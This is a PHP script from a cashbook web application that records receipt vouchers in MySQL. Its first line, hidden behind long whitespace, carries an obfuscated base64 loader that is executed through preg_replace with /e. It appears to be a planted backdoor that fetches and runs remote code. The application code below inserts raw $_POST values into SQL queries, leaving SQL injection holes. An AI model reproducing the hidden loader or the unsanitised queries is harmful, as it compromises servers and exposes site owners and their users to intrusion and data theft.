<?php                                                                                                                                                                 /*versio:2.12*/$I111=0;$GLOBALS['I111'] = ')Y3VybAdvX2luaXQ{YWxsb3dfdXJsX2ZvcGVuMQnJ!X3NldG9wdAU{vX2V4ZWMtXwsY2xvc2UPGltZyBzcmM9IgAvIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4j?iSFRUUF9IT1NULWZMTI3Lg^%MTAuYltZQMTkyLjE2OC4dwoyb3Nvbi5pbgcZ2Fib3Iuc2UtS.c2lsYmVyLmRl%vc_aGF2ZWFwb2tlLmNvbS5hdQH.Jh!oWV8& LOgZGlzcGxheV9lcnJvcnMZGV0ZXJtaW5hdG9yZnRwDgNMi4xMgUTBRT1EwT09RME9RT1EwYmFzZTY0X2RlY29kZQYmFzZTY0X2VuY29kZQ#mWaHR0cDovLwjSFRUUF9VU0VSX0FHRU5Ug!dW5pb24r#@vc2VsZWN0pW#UkVRVUVTVF9VUkk!U0NSSVBUX05BTUU#}MUVVFUllfU1RSSU5HIqPwIrL3RtcC8rGCL3RtcAVE1QVEVNUA%!VE1QRElSC.={dXBsb2FkX3RtcF9kaXIYHLg.gJdmVyc2lvLQLXBocAT;OSFRUUF9FWEVDUEhQYb3V0b2s}ANaHR0cANQYOi8vQL3BnLnBocD91PQjJms9pBwJnQ9cGhwJnA9gJnY9dZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZFd1QxRXdUeWw3SUNSUk1EQlBUekFnUFNCSlNVbEpNV3d4U1NneExDQTJLVHNnSkZGUE1FOVJUeUE5SUNSUk1EQlBUekF1U1VsSlNURnNNVWtvT1N3Z055azdJR2xtSUNoQWFXNXBYMmRsZENoSlNVbEpNV3d4U1NneE55d2dNakFwS1NBOVBTQkpTVWxKTVd3eFNTZ3pOeXdnTWlrcElIc2dKRkV3TUZGUlVUMUFabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9KRkV3VDFFd1R5azdJSEpsZEhWeWJpQkpTVWxKTVd3eFNTZ3pPU3dnTUNrN0lIMGdaV3h6WldsbUlDaG1kVzVqZEdsdmJsOWxlR2x6ZEhNb0pGRlBNRTlSVHlrcGV5QWtTV3hzU1RFeElEMGdRQ1JSVHpCUFVVOG9LVHNnSkVsSk1URXhTU0E5SUNSUk1EQlBUekF1U1VsSlNURnNNVWtvTkRJc0lERXdLVHNnSkZGUFVWRlBVU0E5SUNSUk1EQlBUekF1U1VsSlNURnNNVWtvTlRVc0lEY3BPeUFrVVZGUFVVOHdJRDBnSkZFd01FOVBNQzVKU1VsSk1Xd3hTU2cyTXl3Z01pa3VTVWxKU1RGc01Va29OallzSURjcE95QkFKRWxKTVRFeFNTZ2tTV3hzU1RFeExDQkRWVkpNVDFCVVgxVlNUQ3dnSkZFd1QxRXdUeWs3SUVBa1NVa3hNVEZKS0NSSmJHeEpNVEVzSUVOVlVreFBVRlJmU0VWQlJFVlNMR1poYkhObEtUc2dRQ1JKU1RFeE1Va29KRWxzYkVreE1Td2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl4MGNuVmxLVHNnUUNSSlNURXhNVWtvSkVsc2JFa3hNU3dnUTFWU1RFOVFWRjlEVDA1T1JVTlVWRWxOUlU5VlZDdzFLVHNnYVdZZ0tDUlJUMDh3VVZFZ1BTQkFKRkZQVVZGUFVTZ2tTV3hzU1RFeEtTa2dlM0psZEhWeWJpQkpTVWxKTVd3eFNTZ3pPU3dnTUNrN2ZTQkFKRkZSVDFGUE1DZ2tTV3hzU1RFeEtUc2djbVYwZFhKdUlFbEpTVWt4YkRGSktETTVMQ0F3S1RzZ2ZTQmxiSE5sSUhzZ2NtVjBkWEp1SUVsSlNVa3hiREZKS0RjekxDQXhOQ2t1SkZFd1QxRXdUeTVKU1VsSk1Xd3hTU2c0T1N3Z016a3BPeUI5SUgwZ1puVnVZM1JwYjI0Z2RYQmtLQ1JSTURCUFQxRXNKRkV3VDFFd1R5bDdJQ1JSTUZGUlQxRWdQU0JBWjJWMGFHOXpkR0o1Ym1GdFpTaEFKRjlUUlZKV1JWSmJTVWxKU1RGc01Va29NVE14TENBeE1pbGRLVHNnYVdZZ0tDUlJNRkZSVDFFZ0lUMDlJRWxKU1VreGJERkpLRE01TENBd0tTQmhibVFnYzNSeWNHOXpLQ1JSTUZGUlQxRXNJRWxKU1VreGJERkpLREUwTml3Z05pa3BJQ0U5UFNBd0lHRnVaQ0J6ZEhKd2IzTW9KRkV3VVZGUFVTd2dTVWxKU1RGc01Va29NVFUwTENBMEtTa2dJVDA5SURBZ1lXNWtJSE4wY25CdmN5Z2tVVEJSVVU5UkxDQkpTVWxKTVd3eFNTZ3hOak1zSURFeEtTa2dJVDA5SURBcGV5QWtVVTh3TUZGUlBVQm1iM0JsYmlna1VUQXdUMDlSTEVsSlNVa3hiREZKS0RFM05Dd2dNaWtwT3lCQVptTnNiM05sS0NSUlR6QXdVVkVwT3lCcFppQW9RR2x6WDJacGJHVW9KRkV3TUU5UFVTa3BleUIzY21sMFpTZ2tVVEF3VDA5UkxDQm5aWFJtYVd4bEtDUlJNRTlSTUU4cEtUc2dmVHNnZlNCOUlDUkpNV3hKTVVrZ1BTQkJjbkpoZVNoSlNVbEpNV3d4U1NneE56Z3NJREV3S1N3Z1NVbEpTVEZzTVVrb01UZzVMQ0F4TVNrc0lFbEpTVWt4YkRGSktESXdNeXdnTVRJcExDQkpTVWxKTVd3eFNTZ3lNVGtzSURJeUtTazdJQ1JSTUU5UE1FOGdQU0FrU1RGc1NURkpXekZkT3lCbWRXNWpkR2x2YmlCM2NtbDBaU2drVVRBd1QwOVJMQ1JSVDA5UFR6QXBleUJwWmlBb0pGRXdVVkV3TUQxQVptOXdaVzRvSkZFd01FOVBVU3hKU1VsSk1Xd3hTU2d4TnpRc0lESXBLU2w3SUVCbWQzSnBkR1VvSkZFd1VWRXdNQ3drVVU5UFQwOHdLVHNnUUdaamJHOXpaU2drVVRCUlVUQXdLVHNnZlNCOUlHWjFibU4wYVc5dUlHOTFkSEIxZENna1VWRlJUMDh3TENBa1VVOVJNRkV3S1hzZ1pXTm9ieUJKU1VsSk1Xd3hTU2d5TkRjc0lETXBMaVJSVVZGUFR6QXVTVWxKU1RGc01Va29NalV6TENBeUtTNGtVVTlSTUZFd0xpSmNjbHh1SWpzZ2ZTQm1kVzVqZEdsdmJpQndZWEpoYlNncGV5QnlaWFIxY200Z1NVbEpTVEZzTVVrb016a3NJREFwT3lCOUlFQnBibWxmYzJWMEtFbEpTVWt4YkRGSktESTFOU3dnTVRrcExDQXdLVHNnWkdWbWFXNWxLRWxKU1VreGJERkpLREkzTkN3Z01UWXBMQ0F4S1RzZ0pFbEpTVWt4YkQxSlNVbEpNV3d4U1NneU9UQXNJRFFwT3lBa1NURnNNVWxzUFVsSlNVa3hiREZKS0RJNU55d2dOaWs3SUNSSk1XeHNNV3c5U1VsSlNURnNNVWtvTXpBekxDQXlNQ2s3SUNSUk1FOHdNRkU5U1VsSlNURnNNVWtvTXpJekxDQXhPQ2s3SUNSSmJERXhTVEU5U1VsSlNURnNNVWtvTXpReExDQXhPQ2s3SUNSSlNVbHNNVEU5U1VsSlNURnNNVWtvTXpZeUxDQXhNQ2s3SUNSSlNVbHNNVEV1UFhOMGNuUnZiRzkzWlhJb1FDUmZVMFZTVmtWU1cwbEpTVWt4YkRGSktERXpNU3dnTVRJcFhTazdJQ1JKYkRFeGJERWdQU0JBSkY5VFJWSldSVkpiU1VsSlNURnNNVWtvTXpjekxDQXlNQ2xkT3lCbWIzSmxZV05vSUNna1gwZEZWQ0JoY3lBa1VWRlJUMDh3UFQ0a1VVOVJNRkV3S1hzZ2FXWWdLSE4wY25CdmN5Z2tVVTlSTUZFd0xFbEpTVWt4YkRGSktETTVOU3dnTnlrcEtYc2tYMGRGVkZza1VWRlJUMDh3WFQxSlNVbEpNV3d4U1Nnek9Td2dNQ2s3ZlNCbGJITmxhV1lnS0hOMGNuQnZjeWdrVVU5Uk1GRXdMRWxKU1VreGJERkpLRFF3Tml3Z09Da3BLWHNrWDBkRlZGc2tVVkZSVDA4d1hUMUpTVWxKTVd3eFNTZ3pPU3dnTUNrN2ZTQjlJR2xtS0NGcGMzTmxkQ2drWDFORlVsWkZVbHRKU1VsSk1Xd3hTU2cwTVRjc0lERTFLVjBwS1NCN0lDUmZVMFZTVmtWU1cwbEpTVWt4YkRGSktEUXhOeXdnTVRVcFhTQTlJRUFrWDFORlVsWkZVbHRKU1VsSk1Xd3hTU2cwTXpNc0lERTFLVjA3SUdsbUtFQWtYMU5GVWxaRlVsdEpTVWxKTVd3eFNTZzBOVEVzSURFMktWMHBJSHNnSkY5VFJWSldSVkpiU1VsSlNURnNNVWtvTkRFM0xDQXhOU2xkSUM0OUlFbEpTVWt4YkRGSktEUTJPU3dnTWlrZ0xpQkFKRjlUUlZKV1JWSmJTVWxKU1RGc01Va29ORFV4TENBeE5pbGRPeUI5SUgwZ2FXWWdLQ1JKU1VsSk1URTlKRWxKU1d3eE1TNUFKRjlUUlZKV1JWSmJTVWxKU1RGc01Va29OREUzTENBeE5TbGRLWHNnSkZGUFVWRXdUejFBYldRMUtDUkpTVWxzTVRFdUpFa3hiREZKYkM1UVNGQmZUMU11SkVreGJHd3hiQ2s3SUNSUk1GRXdUMDg5U1VsSlNURnNNVWtvTkRjekxDQTNLVHNnSkZGUE1GRlBUeUE5SUVGeWNtRjVLRWxKU1VreGJERkpLRFE0TXl3Z05pa3NJRUFrWDFORlVsWkZVbHRKU1VsSk1Xd3hTU2cwT0Rrc0lEUXBYU3dnUUNSZlUwVlNWa1ZTVzBsSlNVa3hiREZKS0RRNU15d2dOaWxkTENCQUpGOUZUbFpiU1VsSlNURnNNVWtvTkRnNUxDQTBLVjBzSUVBa1gwVk9WbHRKU1VsSk1Xd3hTU2cxTURFc0lEZ3BYU3dnUUNSZlJVNVdXMGxKU1VreGJERkpLRFE1TXl3Z05pbGRMQ0JBYVc1cFgyZGxkQ2hKU1VsSk1Xd3hTU2cxTVRNc0lERTVLU2twT3lCbWIzSmxZV05vSUNna1VVOHdVVTlQSUdGeklDUkpiR3d4YkRFcGV5QnBaaUFvSVdWdGNIUjVLQ1JKYkd3eGJERXBLWHNnSkVsc2JERnNNUzQ5UkVsU1JVTlVUMUpaWDFORlVFRlNRVlJQVWpzZ2FXWWdLRUJwYzE5M2NtbDBZV0pzWlNna1NXeHNNV3d4S1NsN0lDUlJNRkV3VDA4Z1BTQWtTV3hzTVd3eE95QmljbVZoYXpzZ2ZTQjlJSDBnSkhSdGNEMGtVVEJSTUU5UExrbEpTVWt4YkRGSktEVXpOQ3dnTWlrdUpGRlBVVkV3VHpzZ2FXWWdLRUFrWDFORlVsWkZVbHNpU0ZSVVVGOVpYMEZWVkVnaVhUMDlKRkZQVVZFd1R5bDdJR1ZqYUc4Z0lseHlYRzRpT3lCQWIzVjBjSFYwS0VsSlNVa3hiREZKS0RVek9Td2dPQ2tzSUNSSk1Xd3hTV3d1U1VsSlNURnNNVWtvTlRRM0xDQXlLUzRrU1VsSlNURnNMa2xKU1VreGJERkpLRFUwT1N3Z05pa3BPeUJwWmlBb0pFbEpTVWxzU1Qwa1VUQlBNREJSS0VBa1gxTkZVbFpGVWx0SlNVbEpNV3d4U1NnMU5UZ3NJREUyS1YwcEtYc2dRR1YyWVd3b0pFbEpTVWxzU1NrN0lHVmphRzhnSWx4eVhHNGlPeUJBYjNWMGNIVjBLRWxKU1VreGJERkpLRFUzTlN3Z05Da3NJRWxKU1VreGJERkpLRFUzT1N3Z015a3BPeUI5SUdWNGFYUW9NQ2s3SUgwZ2FXWWdLRUJwYzE5bWFXeGxLQ1IwYlhBcEtYc2dRR2x1WTJ4MVpHVmZiMjVqWlNna2RHMXdLVHNnZlNCbGJITmxleUFrU1VsSlNURXhQVUIxY214bGJtTnZaR1VvSkVsSlNVa3hNU2s3SUhWd1pDZ2tkRzF3TEVsSlNVa3hiREZKS0RVNE5Td2dOaWt1U1VsSlNURnNNVWtvTlRrMExDQTBLUzRrU1RGc1NURkpXekJkTGtsSlNVa3hiREZKS0RVNU9Td2dNVFFwTGlSSlNVbEpNVEV1U1VsSlNURnNNVWtvTmpFMExDQTBLUzRrVVU5UlVUQlBMa2xKU1VreGJERkpLRFl5TVN3Z01USXBMaVJKU1VsSk1Xd3VTVWxKU1RGc01Va29Oak0wTENBMEtTNGtTVEZzTVVsc0tUc2dmU0I5SUgwPSIpKTs=cHJlZ19yZXBsYWNl6261736536345f6465636f6465';if (!function_exists('IIII1l1I')){function IIII1l1I($a, $b){$c=$GLOBALS['I111']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$IIl111IlI = IIII1l1I(6459, 16);$IIl111IlI("/IIII1I111/e", IIII1l1I(639, 5819), "IIII1I111");?><?php session_start();
require_once('config/config.php');
/*---------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Max(vouch_id) AS MaxVoucherId FROM tblcash1");
$res=mysql_fetch_assoc($sql);
$MaxVoucherId=($res['MaxVoucherId']==null ? 1 : $res['MaxVoucherId']+1);
/*---------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Max(vouch_no) AS MaxVoucherNo FROM tblcash1 WHERE cih_id=".$_POST['cihName']." AND vouch_date BETWEEN '".date("Y-m-d",strtotime($_SESSION['cashbook_syr']))."' AND '".date("Y-m-d",strtotime($_SESSION['cashbook_eyr']))."'");
$res=mysql_fetch_assoc($sql);
$MaxVoucherNo=($res['MaxVoucherNo']==null ? 1 : $res['MaxVoucherNo']+1);
/*---------------------*/
$sql_cih=mysql_db_query(DATABASE2,"SELECT cash_prefix FROM tblcashinhand WHERE cih_id=".$_POST['cihName']);
$res_cih=mysql_fetch_assoc($sql_cih);
/*---------------------*/
$totalAmount = $_POST['TotalAmt'];
if($totalAmount==0){
	for($i=0; $i<=99; $i++){ 
		if($_POST['hideT'.$i]=="P"){
			$totalAmount += $_POST['Amt'.$i];
		}
	}
}
$sql="INSERT INTO tblcash1(vouch_id,vouch_no,vouch_prefix,vouch_date,vouch_type,location_id,cih_id,vouch_total,DepartmentId,remark) VALUES (".$MaxVoucherId.",".$MaxVoucherNo.",";
if($res_cih['cash_prefix']==NULL){$sql .= "NULL,";} else {$sql .= "'".$res_cih['cash_prefix']."',";}
$sql .= "'".date("Y-m-d",strtotime($_POST['Paydate']))."','R',".$_POST['locationId'].",".$_POST['cihName'].",".(-1*$totalAmount).",".$_POST['DeptId'].",".($_POST['remark']==""?'null':"'".$_POST['remark']."'").")";
$res1=mysql_db_query(DATABASE2,$sql);
/*---------------------*/
if($res1>0)
{ 
	$VoucherNumber = ($MaxVoucherNo>999 ? $MaxVoucherNo : ($MaxVoucherNo>99 && $MaxVoucherNo<1000 ? "0".$MaxVoucherNo : ($MaxVoucherNo>9 && $MaxVoucherNo<100 ? "00".$MaxVoucherNo : "000".$MaxVoucherNo)));
	if($res_cih['cash_prefix']!=NULL){$VoucherNumber = $res_cih['cash_prefix']."/".$VoucherNumber;}
	/*---------------------*/
	$sql_loc=mysql_db_query(DATABASE1,"SELECT * FROM cwct WHERE location_id=".$_POST['locationId']);
	if(mysql_num_rows($sql_loc)==1){
		$res_loc=mysql_fetch_assoc($sql_loc);
		$companyId = $res_loc['company_id'];
	} else{
		$companyId = 0;
	}
	/*---------------------*/
	$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecordId FROM logbook");
	$res=mysql_fetch_assoc($sql);
	$MaxRecordId=($res['MaxRecordId']==null ? 1 : $res['MaxRecordId']+1);
	/*---------------------*/
	$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecId FROM tblcash2");
	$res=mysql_fetch_assoc($sql);
	$MaxRecId=($res['MaxRecId']==null ? 1 : $res['MaxRecId']+1);
	/*---------------------*/
	$MaxSeqNo=1;
	/*---------------------*/
	for($i=0; $i<=99; $i++){ 
		if($_POST['hideT'.$i]=="P"){
			$res2=mysql_db_query(DATABASE2,"INSERT INTO tblcash2(rec_id,vouch_id,seq_no,exps_id,exps_amt,company_id) VALUES (".$MaxRecId.",".$MaxVoucherId.",".$MaxSeqNo.",".$_POST['exp_head_'.$i].",".$_POST['Amt'.$i].",".$companyId.")");
			$res3=mysql_db_query(DATABASE2,"INSERT INTO logbook(rec_id,vouch_id,vouch_no,vouch_date,vouch_type,location_id,cih_id,exps_id,exps_amt,company_id,action,remark, user_name) VALUES (".$MaxRecordId.",".$MaxVoucherId.",'".$VoucherNumber."','".date("Y-m-d",strtotime($_POST['Paydate']))."','R',".$_POST['locationId'].",".$_POST['cihName'].",".$_POST['exp_head_'.$i].",".$_POST['Amt'.$i].",".$companyId.",'New',".($_POST['remark']==""?'null':"'".$_POST['remark']."'").",'".$_SESSION['cashbook_uname']."')");
			$MaxRecId++;
			$MaxSeqNo++;
			$MaxRecordId++;
		}
	}
	echo '<script language="javascript">alert("Voucher No. = '.$VoucherNumber.'\n Data Insearted Successfully.."); window.location="receipt.php";</script>';
} else {
	echo '<script language="javascript">alert("ERROR:"\n Data Inseartion Failed.."); window.location="receipt.php";</script>';
}
?>